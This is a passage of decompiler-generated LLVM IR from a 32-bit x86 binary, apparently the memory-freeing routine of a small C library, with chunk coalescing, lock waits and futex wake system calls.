  %v1_804a55c = add nsw i32 %v2_804a559, 134572480
  store i32 %v1_804a55c, i32* %ecx.global-to-local, align 4
  %v1_804a562 = icmp eq i32 %v0_804a554, 0
  %v1_804a564 = add nsw i32 %v2_804a559, 134572488
  store i32 %v1_804a564, i32* @edi, align 4
  br i1 %v1_804a562, label %dec_label_pc_804a5ae, label %dec_label_pc_804a569

dec_label_pc_804a569:                             ; preds = %dec_label_pc_804a550
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804a56e = inttoptr i32 %v1_804a564 to i32*
  %v3_804a56e = load i32, i32* %v2_804a56e, align 8
  store i32 1, i32* %v2_804a56e, align 8
  store i32 %v3_804a56e, i32* %eax.global-to-local, align 4
  %v1_804a571 = icmp eq i32 %v3_804a56e, 0
  br i1 %v1_804a571, label %dec_label_pc_804a5ae, label %dec_label_pc_804a575

dec_label_pc_804a575:                             ; preds = %dec_label_pc_804a569
  %v0_804a575 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a577 = add i32 %v0_804a575, 134572492
  store i32 %v1_804a577, i32* @ebx, align 4
  store i32 %v0_804a575, i32* @esi, align 4
  br label %dec_label_pc_804a580

dec_label_pc_804a580:                             ; preds = %dec_label_pc_804a580.dec_label_pc_804a580_crit_edge, %dec_label_pc_804a575
  %v0_804a590 = phi i32 [ %v0_804a590.pre, %dec_label_pc_804a580.dec_label_pc_804a580_crit_edge ], [ %v1_804a577, %dec_label_pc_804a575 ]
  %v0_804a594 = load i32, i32* @edi, align 4
  store i32 %v0_804a594, i32* %stack_var_-76, align 4
  %v4_804a597 = inttoptr i32 %v0_804a594 to i32*
  %v5_804a597 = call i32 @__wait(i32* %v4_804a597, i32 %v0_804a590, i32 1)
  %v0_804a59c = load i32, i32* @esi, align 4
  %v1_804a59c = add i32 %v0_804a59c, 134572480
  store i32 %v1_804a59c, i32* %edx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_804a5a7 = add i32 %v0_804a59c, 134572488
  %v2_804a5a7 = inttoptr i32 %v1_804a5a7 to i32*
  %v3_804a5a7 = load i32, i32* %v2_804a5a7, align 4
  store i32 1, i32* %v2_804a5a7, align 4
  store i32 %v3_804a5a7, i32* %eax.global-to-local, align 4
  %v1_804a5aa = icmp eq i32 %v3_804a5a7, 0
  %v1_804a5ac = icmp eq i1 %v1_804a5aa, false
  br i1 %v1_804a5ac, label %dec_label_pc_804a580.dec_label_pc_804a580_crit_edge, label %dec_label_pc_804a5ae

dec_label_pc_804a580.dec_label_pc_804a580_crit_edge: ; preds = %dec_label_pc_804a580
  %v0_804a590.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804a580

dec_label_pc_804a5ae:                             ; preds = %dec_label_pc_804a580, %dec_label_pc_804a569, %dec_label_pc_804a550
  store i32 %v2_804a559, i32* %edx.global-to-local, align 4
  %v1_804a5b5 = add nsw i32 %v2_804a559, 134572496
  %v2_804a5b5 = inttoptr i32 %v1_804a5b5 to i32*
  %v3_804a5b5 = load i32, i32* %v2_804a5b5, align 16
  store i32 %v3_804a5b5, i32* %eax.global-to-local, align 4
  %v1_804a5bb = icmp eq i32 %v3_804a5b5, 0
  br i1 %v1_804a5bb, label %dec_label_pc_804a86e, label %dec_label_pc_804a5c3

dec_label_pc_804a5c3:                             ; preds = %dec_label_pc_804a5ae, %dec_label_pc_804a86e
  %v0_804a5c3 = load i32, i32* @global_var_8056f8c.333, align 4
  store i32 %v0_804a5c3, i32* %eax.global-to-local, align 4
  %v1_804a5c8 = icmp eq i32 %v0_804a5c3, 0
  %v1_804a5ca = icmp eq i1 %v1_804a5c8, false
  br i1 %v1_804a5ca, label %dec_label_pc_804a73c.preheader, label %dec_label_pc_804a5d0

dec_label_pc_804a73c.preheader:                   ; preds = %dec_label_pc_804a5c3
  %v0_804a74149 = load i32, i32* @global_var_8056dc8.339, align 8
  store i32 1, i32* @global_var_8056dc8.339, align 8
  store i32 %v0_804a74149, i32* %eax.global-to-local, align 4
  %v1_804a74750 = icmp eq i32 %v0_804a74149, 0
  %v1_804a74952 = icmp eq i1 %v1_804a74750, false
  br i1 %v1_804a74952, label %dec_label_pc_804a718, label %dec_label_pc_804a74b

dec_label_pc_804a5d0:                             ; preds = %dec_label_pc_804a5c3
  store i32 %stack_var_-52.0.ph, i32* %ecx.global-to-local, align 4
  %v0_804a5d4 = load i32, i32* @ebp, align 4
  %v1_804a5d4 = inttoptr i32 %v0_804a5d4 to i32*
  %v2_804a5d4 = load i32, i32* %v1_804a5d4, align 4
  store i32 %v2_804a5d4, i32* %eax.global-to-local, align 4
  %v4_804a5d7 = load i32, i32* %v3_804a4fc, align 4
  %v5_804a5d7 = and i32 %v4_804a5d7, %v2_804a5d4
  store i32 %v5_804a5d7, i32* %eax.global-to-local, align 4
  %v1_804a5dc = urem i32 %v5_804a5d7, 2
  %v2_804a5dc = icmp eq i32 %v1_804a5dc, 0
  store i32 %v1_804a5dc, i32* %edx.global-to-local, align 4
  %v1_804a5df = icmp eq i1 %v2_804a5dc, false
  br i1 %v1_804a5df, label %dec_label_pc_804a760, label %dec_label_pc_804a5d0.dec_label_pc_804a5e5_crit_edge

dec_label_pc_804a5d0.dec_label_pc_804a5e5_crit_edge: ; preds = %dec_label_pc_804a5d0
  %v0_804a5e5.pre = load i32, i32* @global_var_8056dc8.339, align 8
  br label %dec_label_pc_804a5e5

dec_label_pc_804a5e5:                             ; preds = %dec_label_pc_804a5d0.dec_label_pc_804a5e5_crit_edge, %dec_label_pc_804a74b
  %v0_804a5f3 = phi i32 [ %v1_804a5dc, %dec_label_pc_804a5d0.dec_label_pc_804a5e5_crit_edge ], [ 0, %dec_label_pc_804a74b ]
  %v0_804a5e5 = phi i32 [ %v0_804a5e5.pre, %dec_label_pc_804a5d0.dec_label_pc_804a5e5_crit_edge ], [ 1, %dec_label_pc_804a74b ]
  store i32 %v0_804a5e5, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056dc8.339 to i32), i32* @ebx, align 4
  %v1_804a5ef = icmp eq i32 %v0_804a5e5, 0
  br i1 %v1_804a5ef, label %dec_label_pc_804a628, label %dec_label_pc_804a5f3

dec_label_pc_804a5f3:                             ; preds = %dec_label_pc_804a5e5
  store i32 %v0_804a5f3, i32* @global_var_8056dc8.339, align 8
  %v2_804a5f9 = load i32, i32* %stack_var_-76, align 4
  %v0_804a5fe = load i32, i32* @global_var_8056dcc.340, align 4
  store i32 %v0_804a5fe, i32* %eax.global-to-local, align 4
  %v1_804a603 = icmp eq i32 %v0_804a5fe, 0
  br i1 %v1_804a603, label %dec_label_pc_804a628, label %dec_label_pc_804a607

dec_label_pc_804a607:                             ; preds = %dec_label_pc_804a5f3
  store i32 240, i32* @esi, align 4
  store i32 129, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  store i32 240, i32* @eax, align 4
  store i32 ptrtoint (i32* @global_var_8056dc8.339 to i32), i32* @edx, align 4
  %v1_804a61a = call i32 @__vsyscall(i32 %v2_804a5f9)
  store i32 %v1_804a61a, i32* %eax.global-to-local, align 4
  %v10_804a61f = icmp eq i32 %v1_804a61a, -38
  br i1 %v10_804a61f, label %dec_label_pc_804a885, label %dec_label_pc_804a628

dec_label_pc_804a628:                             ; preds = %dec_label_pc_804a607, %dec_label_pc_804a5f3, %dec_label_pc_804a5e5, %dec_label_pc_804a885
  store i32 %v2_804a559, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a55c, i32* %edx.global-to-local, align 4
  %v2_804a635 = inttoptr i32 %v1_804a564 to i32*
  %v3_804a635 = load i32, i32* %v2_804a635, align 8
  store i32 %v3_804a635, i32* %eax.global-to-local, align 4
  store i32 %v1_804a564, i32* @ebx, align 4
  %v1_804a63b = icmp eq i32 %v3_804a635, 0
  br i1 %v1_804a63b, label %dec_label_pc_804a677, label %dec_label_pc_804a63f

dec_label_pc_804a63f:                             ; preds = %dec_label_pc_804a628
  store i32 0, i32* %v2_804a635, align 8
  %v2_804a644 = load i32, i32* %stack_var_-76, align 4
  %v0_804a649 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a649 = add i32 %v0_804a649, 134572484
  store i32 %v1_804a649, i32* %eax.global-to-local, align 4
  %v1_804a64f = add i32 %v0_804a649, 134572492
  %v2_804a64f = inttoptr i32 %v1_804a64f to i32*
  %v3_804a64f = load i32, i32* %v2_804a64f, align 4
  store i32 %v3_804a64f, i32* %eax.global-to-local, align 4
  %v1_804a652 = icmp eq i32 %v3_804a64f, 0
  br i1 %v1_804a652, label %dec_label_pc_804a677, label %dec_label_pc_804a656

dec_label_pc_804a656:                             ; preds = %dec_label_pc_804a63f
  store i32 240, i32* @esi, align 4
  store i32 129, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  store i32 240, i32* @eax, align 4
  %v0_804a667 = load i32, i32* @ebx, align 4
  store i32 %v0_804a667, i32* @edx, align 4
  %v1_804a669 = call i32 @__vsyscall(i32 %v2_804a644)
  store i32 %v1_804a669, i32* %eax.global-to-local, align 4
  %v10_804a66e = icmp eq i32 %v1_804a669, -38
  br i1 %v10_804a66e, label %dec_label_pc_804a893, label %dec_label_pc_804a677

dec_label_pc_804a677:                             ; preds = %dec_label_pc_804a656, %dec_label_pc_804a63f, %dec_label_pc_804a628, %dec_label_pc_804a4f5, %dec_label_pc_804a893
  %v0_804a677 = load i32, i32* @ebp, align 4
  store i32 %v0_804a677, i32* @eax, align 4
  %v0_804a679 = call i32 @alloc_rev()
  store i32 %v0_804a679, i32* %eax.global-to-local, align 4
  %v1_804a67e = icmp eq i32 %v0_804a679, 0
  br i1 %v1_804a67e, label %dec_label_pc_804a6b0, label %dec_label_pc_804a682

dec_label_pc_804a682:                             ; preds = %dec_label_pc_804a677
  %v0_804a682 = load i32, i32* @ebp, align 4
  %v1_804a682 = inttoptr i32 %v0_804a682 to i32*
  %v2_804a682 = load i32, i32* %v1_804a682, align 4
  store i32 %v1_804a4d3, i32* %ecx.global-to-local, align 4
  %v1_804a689 = and i32 %v2_804a682, -2
  store i32 %v1_804a689, i32* %eax.global-to-local, align 4
  %v2_804a68c = sub i32 %v0_804a682, %v1_804a689
  store i32 %v2_804a68c, i32* @ebp, align 4
  %v1_804a68e = add i32 %v2_804a68c, 4
  %v2_804a68e = inttoptr i32 %v1_804a68e to i32*
  %v3_804a68e = load i32, i32* %v2_804a68e, align 4
  %v1_804a691 = and i32 %v3_804a68e, -2
  store i32 %v1_804a691, i32* %edx.global-to-local, align 4
  %v2_804a694 = add i32 %v1_804a691, %v1_804a4d3
  store i32 %v2_804a694, i32* %eax.global-to-local, align 4
  %v5_804a697 = add i32 %v1_804a691, %stack_var_-48.0
  %tmp57 = icmp ult i32 %v2_804a694, 163841
  br i1 %tmp57, label %dec_label_pc_804a6b0, label %dec_label_pc_804a6a2

dec_label_pc_804a6a2:                             ; preds = %dec_label_pc_804a682
  %v2_804a6a2 = xor i32 %v2_804a694, %v1_804a691
  store i32 %v2_804a6a2, i32* %eax.global-to-local, align 4
  %v7_804a6a4 = icmp ult i32 %v1_804a691, %v2_804a6a2
  %v1_804a6a6 = icmp eq i1 %v7_804a6a4, false
  %stack_var_-40.0. = select i1 %v1_804a6a6, i32 %stack_var_-40.0, i32 1
  br label %dec_label_pc_804a6b0

dec_label_pc_804a6b0:                             ; preds = %dec_label_pc_804a6a2, %dec_label_pc_804a682, %dec_label_pc_804a677
  %stack_var_-48.1 = phi i32 [ %stack_var_-48.0, %dec_label_pc_804a677 ], [ %v5_804a697, %dec_label_pc_804a682 ], [ %v5_804a697, %dec_label_pc_804a6a2 ]
  %stack_var_-40.1 = phi i32 [ %stack_var_-40.0, %dec_label_pc_804a677 ], [ %stack_var_-40.0, %dec_label_pc_804a682 ], [ %stack_var_-40.0., %dec_label_pc_804a6a2 ]
  store i32 %stack_var_-52.0.ph, i32* @eax, align 4
  %v0_804a6b4 = call i32 @alloc_fwd()
  store i32 %v0_804a6b4, i32* %eax.global-to-local, align 4
  %v1_804a6b9 = icmp eq i32 %v0_804a6b4, 0
  br i1 %v1_804a6b9, label %dec_label_pc_804a4f5, label %dec_label_pc_804a6c1

dec_label_pc_804a6c1:                             ; preds = %dec_label_pc_804a6b0
  store i32 %stack_var_-52.0.ph, i32* %eax.global-to-local, align 4
  store i32 %v1_804a4d3, i32* %ecx.global-to-local, align 4
  %v3_804a6c9 = load i32, i32* %v3_804a4fc, align 4
  %v1_804a6cc = and i32 %v3_804a6c9, -2
  store i32 %v1_804a6cc, i32* %edx.global-to-local, align 4
  %v2_804a6cf = add i32 %v1_804a6cc, %v1_804a4d3
  store i32 %v2_804a6cf, i32* %eax.global-to-local, align 4
  %tmp58 = icmp ult i32 %v2_804a6cf, 163841
  br i1 %tmp58, label %dec_label_pc_804a6e7, label %dec_label_pc_804a6d9

dec_label_pc_804a6d9:                             ; preds = %dec_label_pc_804a6c1
  %v2_804a6d9 = xor i32 %v2_804a6cf, %v1_804a6cc
  store i32 %v2_804a6d9, i32* %eax.global-to-local, align 4
  %v7_804a6db = icmp ult i32 %v1_804a6cc, %v2_804a6d9
  %v1_804a6dd = icmp eq i1 %v7_804a6db, false
  %stack_var_-40.1. = select i1 %v1_804a6dd, i32 %stack_var_-40.1, i32 1
  br label %dec_label_pc_804a6e7

dec_label_pc_804a6e7:                             ; preds = %dec_label_pc_804a6d9, %dec_label_pc_804a6c1
  %stack_var_-40.2 = phi i32 [ %stack_var_-40.1, %dec_label_pc_804a6c1 ], [ %stack_var_-40.1., %dec_label_pc_804a6d9 ]
  %v5_804a6e7 = add i32 %v1_804a6cc, %stack_var_-48.1
  %v5_804a6eb = add i32 %v1_804a6cc, %stack_var_-52.0.ph
  br label %dec_label_pc_804a4f5.outer

dec_label_pc_804a6f4:                             ; preds = %dec_label_pc_804a4c3
  %v2_804a6f4 = inttoptr i32 %v1_804a4c3 to i32*
  %v3_804a6f4 = load i32, i32* %v2_804a6f4, align 4
  store i32 %v3_804a6f4, i32* %edx.global-to-local, align 4
  %v1_804a6fd = and i32 %v3_804a4c6, -2
  %v2_804a700 = sub i32 %v1_804a4c3, %v3_804a6f4
  %v2_804a702 = add i32 %v3_804a6f4, %v1_804a6fd
  store i32 %v2_804a702, i32* @eax, align 4
  store i32 %v2_804a700, i32* %stack_var_-76, align 4
  %v1_804a70b = call i32 @__munmap(i32 %v2_804a702)
  store i32 %v1_804a70b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a710

dec_label_pc_804a710:                             ; preds = %entry.dec_label_pc_804a710_crit_edge, %dec_label_pc_804a83d, %dec_label_pc_804a822, %dec_label_pc_804a817, %dec_label_pc_804a860, %dec_label_pc_804a6f4
  %v0_804a717 = phi i32 [ %v0_804a717.pre, %entry.dec_label_pc_804a710_crit_edge ], [ %v1_804a852, %dec_label_pc_804a83d ], [ 0, %dec_label_pc_804a822 ], [ 0, %dec_label_pc_804a817 ], [ %v1_804a864, %dec_label_pc_804a860 ], [ %v1_804a70b, %dec_label_pc_804a6f4 ]
  store i32 %v0_804a4b3, i32* @ebx, align 4
  store i32 %v0_804a4b2, i32* @esi, align 4
  store i32 %v0_804a4b1, i32* @edi, align 4
  store i32 %v0_804a4b0, i32* @ebp, align 4
  ret i32 %v0_804a717

dec_label_pc_804a718:                             ; preds = %dec_label_pc_804a73c.preheader, %dec_label_pc_804a718
  store i32 ptrtoint (i32* @global_var_8056dc8.339 to i32), i32* %stack_var_-76, align 4
  %v5_804a737 = call i32 @__wait(i32* nonnull @global_var_8056dc8.339, i32 ptrtoint (i32* @global_var_8056dcc.340 to i32), i32 1)
  %v0_804a741 = load i32, i32* @global_var_8056dc8.339, align 8
  store i32 1, i32* @global_var_8056dc8.339, align 8
  store i32 %v0_804a741, i32* %eax.global-to-local, align 4
  %v1_804a747 = icmp eq i32 %v0_804a741, 0
  %v1_804a749 = icmp eq i1 %v1_804a747, false
  br i1 %v1_804a749, label %dec_label_pc_804a718, label %dec_label_pc_804a74b

dec_label_pc_804a74b:                             ; preds = %dec_label_pc_804a718, %dec_label_pc_804a73c.preheader
  store i32 %stack_var_-52.0.ph, i32* %ecx.global-to-local, align 4
  %v0_804a74f = load i32, i32* @ebp, align 4
  %v1_804a74f = inttoptr i32 %v0_804a74f to i32*
  %v2_804a74f = load i32, i32* %v1_804a74f, align 4
  store i32 %v2_804a74f, i32* %eax.global-to-local, align 4
  %v4_804a752 = load i32, i32* %v3_804a4fc, align 4
  %v5_804a752 = and i32 %v4_804a752, %v2_804a74f
  store i32 %v5_804a752, i32* %eax.global-to-local, align 4
  %v1_804a757 = urem i32 %v5_804a752, 2
  %v2_804a757 = icmp eq i32 %v1_804a757, 0
  store i32 %v1_804a757, i32* %edx.global-to-local, align 4
  br i1 %v2_804a757, label %dec_label_pc_804a5e5, label %dec_label_pc_804a760

dec_label_pc_804a760:                             ; preds = %dec_label_pc_804a74b, %dec_label_pc_804a5d0
  %v1_804a7b7 = phi i32 [ %v0_804a74f, %dec_label_pc_804a74b ], [ %v0_804a5d4, %dec_label_pc_804a5d0 ]
  %v4_804a550.le = sdiv i32 %sext, 16777216
  store i32 %v4_804a550.le, i32* @ecx, align 4
  %v0_804a765 = load i32, i32* @global_var_80569c0.334, align 64
  store i32 %v0_804a765, i32* %eax.global-to-local, align 4
  %v0_804a76a = load i32, i32* @global_var_80569c4.335, align 4
  store i32 %v0_804a76a, i32* %edx.global-to-local, align 4
  %v3_804a770 = urem i32 %v4_804a550.le, 32
  %v6_804a770 = icmp eq i32 %v3_804a770, 0
  br i1 %v6_804a770, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_804a760
  %v7_804a770 = lshr i32 %v0_804a765, %v3_804a770
  %v8_804a770 = sub nsw i32 32, %v3_804a770
  %v9_804a770 = shl i32 %v0_804a76a, %v8_804a770
  %v10_804a770 = or i32 %v9_804a770, %v7_804a770
  store i32 %v10_804a770, i32* %eax.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_804a760, %bb
  %v0_804a77e14 = phi i32 [ %v0_804a765, %dec_label_pc_804a760 ], [ %v10_804a770, %bb ]
  %v4_804a773 = icmp eq i32 %v3_804a770, 0
  br i1 %v4_804a773, label %bb44, label %bb43

bb43:                                             ; preds = %bb42
  %v5_804a773 = lshr i32 %v0_804a76a, %v3_804a770
  store i32 %v5_804a773, i32* %edx.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %bb42, %bb43
  %v0_804a77a = phi i32 [ %v0_804a76a, %bb42 ], [ %v5_804a773, %bb43 ]
  %v2_804a775 = and i32 %v4_804a550.le, 32
  %v3_804a775 = icmp eq i32 %v2_804a775, 0
  br i1 %v3_804a775, label %dec_label_pc_804a77e, label %dec_label_pc_804a77a

dec_label_pc_804a77a:                             ; preds = %bb44
  store i32 %v0_804a77a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a77e

dec_label_pc_804a77e:                             ; preds = %bb44, %dec_label_pc_804a77a
  %v0_804a77e = phi i32 [ %v0_804a77e14, %bb44 ], [ %v0_804a77a, %dec_label_pc_804a77a ]
  %v1_804a77e = urem i32 %v0_804a77e, 2
  %v2_804a77e = icmp eq i32 %v1_804a77e, 0
  store i32 %v1_804a77e, i32* %eax.global-to-local, align 4
  %v1_804a783 = icmp eq i1 %v2_804a77e, false
  br i1 %v1_804a783, label %dec_label_pc_804a7aa, label %dec_label_pc_804a785

dec_label_pc_804a785:                             ; preds = %dec_label_pc_804a77e
  store i32 ptrtoint (i32* @global_var_80569c0.334 to i32), i32* %esi.global-to-local, align 4
  %v1_804a791 = icmp eq i1 %v3_804a775, false
  %v2_804a791 = zext i1 %v1_804a791 to i32
  store i32 %v2_804a791, i32* %edx.global-to-local, align 4
  %v1_804a794 = zext i1 %v3_804a775 to i32
  store i32 %v1_804a794, i32* %eax.global-to-local, align 4
  br i1 %v4_804a773, label %.thread, label %bb45

.thread:                                          ; preds = %dec_label_pc_804a785
  br label %bb46

bb45:                                             ; preds = %dec_label_pc_804a785
  %v5_804a797 = shl i32 %v2_804a791, %v3_804a770
  store i32 %v5_804a797, i32* %edx.global-to-local, align 4
  %v5_804a79b = shl i32 %v1_804a794, %v3_804a770
  store i32 %v5_804a79b, i32* %eax.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %.thread, %bb45
  %v0_804a79f24 = phi i32 [ %v5_804a797, %bb45 ], [ %v2_804a791, %.thread ]
  %v3_804a7a3 = phi i32 [ %v5_804a79b, %bb45 ], [ %v1_804a794, %.thread ]
  store i32 %v0_804a79f24, i32* @ecx, align 4
  %v4_804a7a3 = or i32 %v3_804a7a3, %v0_804a765
  store i32 %v4_804a7a3, i32* @global_var_80569c0.334, align 4
  %v5_804a7a6 = or i32 %v0_804a79f24, %v0_804a76a
  store i32 %v5_804a7a6, i32* @global_var_80569c4.335, align 4
  br label %dec_label_pc_804a7aa

dec_label_pc_804a7aa:                             ; preds = %dec_label_pc_804a77e, %bb46
  store i32 %stack_var_-48.0, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056dc8.339 to i32), i32* @ebx, align 4
  store i32 %stack_var_-52.0.ph, i32* %edx.global-to-local, align 4
  %v2_804a7b7 = add i32 %v1_804a7b7, 4
  %v3_804a7b7 = inttoptr i32 %v2_804a7b7 to i32*
  store i32 %stack_var_-48.0, i32* %v3_804a7b7, align 4
  %v0_804a7ba = load i32, i32* %eax.global-to-local, align 4
  %v1_804a7ba = load i32, i32* %edx.global-to-local, align 4
  %v2_804a7ba = inttoptr i32 %v1_804a7ba to i32*
  store i32 %v0_804a7ba, i32* %v2_804a7ba, align 4
  %v0_804a7bc = load i32, i32* @global_var_8056dc8.339, align 8
  store i32 %v0_804a7bc, i32* %eax.global-to-local, align 4
  %v1_804a7c1 = icmp eq i32 %v0_804a7bc, 0
  br i1 %v1_804a7c1, label %dec_label_pc_804a7de, label %dec_label_pc_804a7c5

dec_label_pc_804a7c5:                             ; preds = %dec_label_pc_804a7aa
  store i32 0, i32* @global_var_8056dc8.339, align 8
  %v2_804a7cc = load i32, i32* %stack_var_-76, align 4
  %v0_804a7d1 = load i32, i32* @global_var_8056dcc.340, align 4
  store i32 %v0_804a7d1, i32* %eax.global-to-local, align 4
  %v1_804a7d6 = icmp eq i32 %v0_804a7d1, 0
  %v1_804a7d8 = icmp eq i1 %v1_804a7d6, false
  br i1 %v1_804a7d8, label %dec_label_pc_804a8a1, label %dec_label_pc_804a7de

dec_label_pc_804a7de:                             ; preds = %dec_label_pc_804a8a1, %dec_label_pc_804a7c5, %dec_label_pc_804a7aa, %dec_label_pc_804a8c2
  store i32 %stack_var_-40.0, i32* @edi, align 4
  store i32 %v2_804a559, i32* %esi.global-to-local, align 4
  store i32 %v1_804a55c, i32* @ebx, align 4
  %v1_804a7ef = icmp eq i32 %stack_var_-40.0, 0
  store i32 %v1_804a564, i32* %eax.global-to-local, align 4
  store i32 %v1_804a564, i32* @edx, align 4
  %v1_804a7fc = load i32, i32* @ebp, align 4
  %v2_804a7fc = add i32 %v1_804a7fc, 8
  %v3_804a7fc = inttoptr i32 %v2_804a7fc to i32*
  store i32 %v1_804a564, i32* %v3_804a7fc, align 4
  %v0_804a7ff = load i32, i32* %esi.global-to-local, align 4
  %v1_804a7ff = add i32 %v0_804a7ff, 134572500
  %v2_804a7ff = inttoptr i32 %v1_804a7ff to i32*
  %v3_804a7ff = load i32, i32* %v2_804a7ff, align 4
  store i32 %v3_804a7ff, i32* %eax.global-to-local, align 4
  %v1_804a805 = load i32, i32* @ebp, align 4
  %v2_804a805 = add i32 %v1_804a805, 12
  %v3_804a805 = inttoptr i32 %v2_804a805 to i32*
  store i32 %v3_804a7ff, i32* %v3_804a805, align 4
  %v0_804a808 = load i32, i32* @ebp, align 4
  %v1_804a808 = load i32, i32* @edx, align 4
  %v2_804a808 = add i32 %v1_804a808, 12
  %v3_804a808 = inttoptr i32 %v2_804a808 to i32*
  store i32 %v0_804a808, i32* %v3_804a808, align 4
  %v0_804a80b = load i32, i32* @ebp, align 4
  %v1_804a80b = add i32 %v0_804a80b, 12
  %v2_804a80b = inttoptr i32 %v1_804a80b to i32*
  %v3_804a80b = load i32, i32* %v2_804a80b, align 4
  store i32 %v3_804a80b, i32* %eax.global-to-local, align 4
  %v2_804a80e = add i32 %v3_804a80b, 8
  %v3_804a80e = inttoptr i32 %v2_804a80e to i32*
  store i32 %v0_804a80b, i32* %v3_804a80e, align 4
  %v1_804a811 = icmp eq i1 %v1_804a7ef, false
  br i1 %v1_804a811, label %dec_label_pc_804a8d0, label %dec_label_pc_804a817

dec_label_pc_804a817:                             ; preds = %dec_label_pc_804a7de, %dec_label_pc_804a8d0
  %v0_804a817 = load i32, i32* @ebx, align 4
  %v1_804a817 = add i32 %v0_804a817, 8
  %v2_804a817 = inttoptr i32 %v1_804a817 to i32*
  %v3_804a817 = load i32, i32* %v2_804a817, align 4
  store i32 %v3_804a817, i32* %eax.global-to-local, align 4
  %v1_804a81a = icmp eq i32 %v3_804a817, 0
  br i1 %v1_804a81a, label %dec_label_pc_804a710, label %dec_label_pc_804a822

dec_label_pc_804a822:                             ; preds = %dec_label_pc_804a817
  store i32 0, i32* %v2_804a817, align 4
  %v2_804a827 = load i32, i32* %stack_var_-76, align 4
  %v0_804a82c = load i32, i32* %esi.global-to-local, align 4
  %v1_804a82c = add i32 %v0_804a82c, 134572484
  store i32 %v1_804a82c, i32* %eax.global-to-local, align 4
  %v1_804a832 = add i32 %v0_804a82c, 134572492
  %v2_804a832 = inttoptr i32 %v1_804a832 to i32*
  %v3_804a832 = load i32, i32* %v2_804a832, align 4
  store i32 %v3_804a832, i32* %eax.global-to-local, align 4
  %v1_804a835 = icmp eq i32 %v3_804a832, 0
  br i1 %v1_804a835, label %dec_label_pc_804a710, label %dec_label_pc_804a83d

dec_label_pc_804a83d:                             ; preds = %dec_label_pc_804a822
  store i32 240, i32* @ebx, align 4
  store i32 129, i32* @ecx, align 4
  store i32 %v1_804a564, i32* @edx, align 4
  store i32 1, i32* @edi, align 4
  store i32 240, i32* @eax, align 4
  %v1_804a852 = call i32 @__vsyscall(i32 %v2_804a827)
  store i32 %v1_804a852, i32* %eax.global-to-local, align 4
  %v10_804a857 = icmp eq i32 %v1_804a852, -38
  %v1_804a85a = icmp eq i1 %v10_804a857, false
  br i1 %v1_804a85a, label %dec_label_pc_804a710, label %dec_label_pc_804a860

dec_label_pc_804a860:                             ; preds = %dec_label_pc_804a83d
  %v0_804a860 = load i32, i32* @ebx, align 4
  store i32 %v0_804a860, i32* @eax, align 4
  %v0_804a862 = load i32, i32* @edi, align 4
  store i32 %v0_804a862, i32* @ecx, align 4
  %v0_804a864 = load i32, i32* %stack_var_-76, align 4
  %v1_804a864 = call i32 @__vsyscall(i32 %v0_804a864)
  store i32 %v1_804a864, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a710

dec_label_pc_804a86e:                             ; preds = %dec_label_pc_804a5ae
  store i32 %v1_804a564, i32* %eax.global-to-local, align 4
  %v2_804a874 = add nsw i32 %v2_804a559, 134572500
  %v3_804a874 = inttoptr i32 %v2_804a874 to i32*
  store i32 %v1_804a564, i32* %v3_804a874, align 4
  %v0_804a87a = load i32, i32* %eax.global-to-local, align 4
  %v1_804a87a = load i32, i32* %edx.global-to-local, align 4
  %v2_804a87a = add i32 %v1_804a87a, 134572496
  %v3_804a87a = inttoptr i32 %v2_804a87a to i32*
  store i32 %v0_804a87a, i32* %v3_804a87a, align 4
  br label %dec_label_pc_804a5c3

dec_label_pc_804a885:                             ; preds = %dec_label_pc_804a607
  %v0_804a885 = load i32, i32* @esi, align 4
  store i32 %v0_804a885, i32* @eax, align 4
  %v0_804a887 = load i32, i32* @edi, align 4
  store i32 %v0_804a887, i32* %ecx.global-to-local, align 4
  %v0_804a889 = load i32, i32* %stack_var_-76, align 4
  %v1_804a889 = call i32 @__vsyscall(i32 %v0_804a889)
  store i32 %v1_804a889, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a628

dec_label_pc_804a893:                             ; preds = %dec_label_pc_804a656
  %v0_804a893 = load i32, i32* @esi, align 4
  store i32 %v0_804a893, i32* @eax, align 4
  %v0_804a895 = load i32, i32* @edi, align 4
  store i32 %v0_804a895, i32* %ecx.global-to-local, align 4
  %v0_804a897 = load i32, i32* %stack_var_-76, align 4
  %v1_804a897 = call i32 @__vsyscall(i32 %v0_804a897)
  store i32 %v1_804a897, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a677

dec_label_pc_804a8a1:                             ; preds = %dec_label_pc_804a7c5
  store i32 240, i32* %esi.global-to-local, align 4
  store i32 129, i32* @ecx, align 4
  store i32 1, i32* @edi, align 4
  store i32 240, i32* @eax, align 4
  %v0_804a8b2 = load i32, i32* @ebx, align 4
  store i32 %v0_804a8b2, i32* @edx, align 4
  %v1_804a8b4 = call i32 @__vsyscall(i32 %v2_804a7cc)
  store i32 %v1_804a8b4, i32* %eax.global-to-local, align 4
  %v10_804a8b9 = icmp eq i32 %v1_804a8b4, -38
  %v1_804a8bc = icmp eq i1 %v10_804a8b9, false
  br i1 %v1_804a8bc, label %dec_label_pc_804a7de, label %dec_label_pc_804a8c2

dec_label_pc_804a8c2:                             ; preds = %dec_label_pc_804a8a1
  %v0_804a8c2 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804a8c2, i32* @eax, align 4
  %v0_804a8c4 = load i32, i32* @edi, align 4
  store i32 %v0_804a8c4, i32* @ecx, align 4
  %v0_804a8c6 = load i32, i32* %stack_var_-76, align 4
  %v1_804a8c6 = call i32 @__vsyscall(i32 %v0_804a8c6)
